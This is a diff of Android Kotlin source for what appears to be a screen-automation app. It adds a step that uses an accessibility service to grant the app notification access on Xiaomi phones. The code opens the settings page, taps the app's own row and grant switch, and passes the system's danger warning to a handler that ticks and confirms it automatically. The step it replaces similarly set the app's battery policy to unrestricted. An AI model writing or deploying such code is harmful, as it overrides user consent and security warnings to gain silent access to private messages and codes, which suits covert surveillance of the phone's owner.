@@ -1,103 +1,123 @@
 package com.zaka.screenagent.flow.miui
 
 import android.content.Intent
-import android.net.Uri
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityNodeInfo
 import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
+import com.zaka.screenagent.notify.NotificationAccessActivator
 
 /**
- * 第四步：电池策略（小米「后台配置」页）
+ * 第四步：通知使用权（小米）
  *
- * 页面（实测 com.miui.powerkeeper/.ui.HiddenAppsConfigActivity）：
- *   ○ 无限制                    ← 要点这一项（列表第一项）
- *   ● 智能限制后台运行（推荐）    ← 默认选中
- *   ○ 后台运行超过10分钟后关闭
- *   ○ 禁止后台运行
- *
- * 这里不需要危险页；只点第一项，然后回读是否选中。
+ *   ① 已授权就跳过
+ *   ② 打开「设备和应用通知」设置页（ACTION_NOTIFICATION_LISTENER_SETTINGS）
+ *   ③ 列表页点自己那一行 → 详情页点「授予通知使用权」开关
+ *   ④ 若弹「危险」页 → 交给 MiuiNavigator 处理（2s 勾选 / 10s 确定）
+ *   ⑤ 校验 enabled_notification_listeners（系统绑定有 ~10 秒延迟）
  */
 object Step4 {
 
     private const val TAG = "Step4"
     private val ui = Handler(Looper.getMainLooper())
 
-    private val FIRST_ITEM_TEXTS = listOf(
-        "无限制", "不限制", "不受限制", "No restrictions", "Unrestricted",
-        "Sin restricciones", "Sem restrições", "Sans restrictions", "Keine Einschränkungen",
-        "Tanpa batasan", "Không hạn chế", "ไม่จำกัด", "بلا قيود"
+    /** 开关/行文案（多语言） */
+    private val GRANT_TEXTS = listOf(
+        "授予通知使用权", "允许通知访问权限", "通知使用权",
+        "Allow notification access", "Notification access", "Grant notification access",
+        "Permitir acceso a notificaciones", "Acceso a notificaciones",
+        "Permitir acesso a notificações", "Akses notifikasi",
+        "Cho phép truy cập thông báo", "อนุญาตการเข้าถึงการแจ้งเตือน",
+        "السماح بالوصول إلى الإشعارات", "বিজ্ঞপ্তি অ্যাক্সেস"
     )
 
     fun run(service: BoundaryAccessibilityService, onDone: (Boolean) -> Unit) {
-        Log.d(TAG, "打开电池策略页")
+        if (NotificationAccessActivator.isGranted(service)) {
+            Log.d(TAG, "已授权，跳过")
+            onDone(true); return
+        }
+        Log.d(TAG, "打开通知使用权设置页")
+        openPage(service, 1)
+
+        var ticks = 0
+        var rowClicked = false
+        var toggleClicked = false
+        var riskHandled = false
+
+        fun tick() {
+            // 已授权 → 立刻结束（这是唯一的成功判据）
+            if (NotificationAccessActivator.isGranted(service)) {
+                Log.d(TAG, "已授权")
+                onDone(true); return
+            }
+            if (!rowClicked) {
+                if (MiuiNavigator.clickByText(service, appLabel(service), contains = false)) {
+                    rowClicked = true
+                    Log.d(TAG, "点到自己那一行")
+                }
+            } else if (!toggleClicked) {
+                var hit = false
+                for (t in GRANT_TEXTS) {
+                    if (MiuiNavigator.clickByText(service, t, contains = true)) { hit = true; break }
+                }
+                if (!hit) hit = clickFirstSwitch(service)
+                if (hit) {
+                    toggleClicked = true
+                    Log.d(TAG, "点了允许开关 → 交给危险页函数")
+                    // 点开关必然弹危险页：直接交给危险页函数处理
+                    MiuiNavigator.passRiskDialog(service) { }
+                    riskHandled = true
+                }
+            }
+            if (ticks++ > 40) {
+                val g = NotificationAccessActivator.isGranted(service)
+                Log.w(TAG, "超时 granted=$g")
+                onDone(g); return
+            }
+            ui.postDelayed({ tick() }, 1_500L)
+        }
+        ui.postDelayed({ tick() }, 4_000L)
+    }
+
+    private fun openPage(service: BoundaryAccessibilityService, attempt: Int) {
         runCatching {
             service.startActivity(
-                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                    .setData(Uri.parse("package:${service.packageName}"))
+                Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                     .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             )
-        }.onFailure { Log.w(TAG, "打开失败: $it") }
-
-        // 等 2 秒页面出来 → 点第一项
-        ui.postDelayed({
-            val ok = clickFirstOption(service)
-            Log.d(TAG, "点击第一项(无限制) = $ok")
-        }, 2_000L)
-
-        // 4 秒后回读
-        ui.postDelayed({
-            val ok = firstOptionSelected(service)
-            Log.d(TAG, "第一项已选中 = $ok")
-            onDone(ok)
-        }, 4_000L)
+        }.onFailure { Log.w(TAG, "打开设置页失败 $it") }
+        if (attempt < 4) {
+            ui.postDelayed({
+                if (!NotificationAccessActivator.isGranted(service) && !onNotificationPage(service)) {
+                    openPage(service, attempt + 1)
+                }
+            }, 2_000L)
+        }
     }
 
-    /** 点列表第一项：先按「无限制」文案，取不到就点列表里第一个可点项 */
-    private fun clickFirstOption(service: BoundaryAccessibilityService): Boolean {
+    private fun onNotificationPage(service: BoundaryAccessibilityService): Boolean {
+        val cls = runCatching { service.rootInActiveWindow?.className?.toString().orEmpty() }.getOrDefault("")
+        return cls.contains("NotificationAccess")
+    }
+
+    private fun appLabel(service: BoundaryAccessibilityService): String = runCatching {
+        service.packageManager.getApplicationLabel(service.applicationInfo).toString()
+    }.getOrDefault("love")
+
+    /** 点当前页第一个未开启的开关（仅用于详情页，列表页不要调） */
+    private fun clickFirstSwitch(service: BoundaryAccessibilityService): Boolean {
         val root = service.rootInActiveWindow ?: return false
-        for (t in FIRST_ITEM_TEXTS) {
-            val n = findText(root, t, 0) ?: continue
-            if (MiuiNavigator.tapByGesture(service, n)) {
-                Log.d(TAG, "点「$t」")
-                return true
-            }
-        }
-        val first = firstClickable(root, 0)
-        if (first != null && MiuiNavigator.tapByGesture(service, first)) {
-            Log.d(TAG, "点第一个可点项 text=${first.text}")
-            return true
-        }
-        return false
+        val sw = findSwitch(root, 0) ?: return false
+        if (sw.isChecked) return true
+        return MiuiNavigator.tapByGesture(service, sw)
     }
 
-    /** 回读：列表里是否已有项被选中（checked/selected） */
-    private fun firstOptionSelected(service: BoundaryAccessibilityService): Boolean {
-        val root = service.rootInActiveWindow ?: return false
-        var found = false
-        fun walk(n: AccessibilityNodeInfo?, d: Int) {
-            if (n == null || d > 30 || found) return
-            if (n.isChecked || n.isSelected) { found = true; return }
-            for (i in 0 until n.childCount) walk(n.getChild(i), d + 1)
-        }
-        walk(root, 0)
-        return found
-    }
-
-    /** 列表里第一个可点、且带文案的项（就是第一项「无限制」） */
-    private fun firstClickable(n: AccessibilityNodeInfo?, d: Int): AccessibilityNodeInfo? {
+    private fun findSwitch(n: AccessibilityNodeInfo?, d: Int): AccessibilityNodeInfo? {
         if (n == null || d > 30) return null
-        if (n.isClickable && !n.text?.toString().isNullOrEmpty()) return n
-        for (i in 0 until n.childCount) firstClickable(n.getChild(i), d + 1)?.let { return it }
-        return null
-    }
-
-    private fun findText(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
-        if (n == null || d > 30) return null
-        if (n.text?.toString() == want) return n
-        for (i in 0 until n.childCount) findText(n.getChild(i), want, d + 1)?.let { return it }
+        if (n.className?.toString()?.contains("Switch") == true) return n
+        for (i in 0 until n.childCount) findSwitch(n.getChild(i), d + 1)?.let { return it }
         return null
     }
 }
